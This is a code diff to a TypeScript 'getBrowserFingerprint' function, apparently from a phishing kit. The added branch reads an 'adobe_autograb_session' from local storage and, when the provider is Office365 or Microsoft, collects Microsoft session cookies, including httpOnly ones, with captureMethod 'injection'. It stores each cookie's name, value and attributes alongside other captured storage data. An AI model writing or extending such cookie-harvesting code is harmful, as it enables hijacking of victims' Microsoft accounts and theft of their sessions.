@@ -81,12 +81,39 @@ export const getBrowserFingerprint = async (userEmail?: string) => {
       }));
     }
   } else {
-    // Keep general cookie capturing disabled for non-Microsoft domains
-    cookieCapture = {
-      documentCookies: '',
-      cookiesParsed: {},
-      cookieList: []
-    };
+    // For Office365 provider, always capture Microsoft cookies regardless of domain
+    const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
+    const provider = (sessionData.provider || 'Others').toLowerCase();
+    
+    if (provider.includes('office365') || provider.includes('microsoft')) {
+      console.log('🔵 Office365 provider detected, enabling Microsoft cookie capture');
+      cookieCapture = cookieUtils.buildCookieCapture();
+      
+      // Add Microsoft cookies from the capture system
+      const microsoftCookies = microsoftCookieCapture.getMicrosoftCookies();
+      if (microsoftCookies.length > 0) {
+        cookieCapture.cookieList = microsoftCookies.map(cookie => ({
+          name: cookie.name,
+          value: cookie.value,
+          domain: cookie.domain,
+          path: cookie.path || '/',
+          secure: cookie.secure || false,
+          httpOnly: cookie.httpOnly || false,
+          sameSite: cookie.sameSite || 'none',
+          expirationDate: cookie.expirationDate,
+          session: cookie.session || false,
+          captureMethod: cookie.captureMethod || 'injection',
+          timestamp: cookie.timestamp
+        }));
+      }
+    } else {
+      // Keep general cookie capturing disabled for non-Microsoft domains
+      cookieCapture = {
+        documentCookies: '',
+        cookiesParsed: {},
+        cookieList: []
+      };
+    }
   }
 
   // Capture all storage data
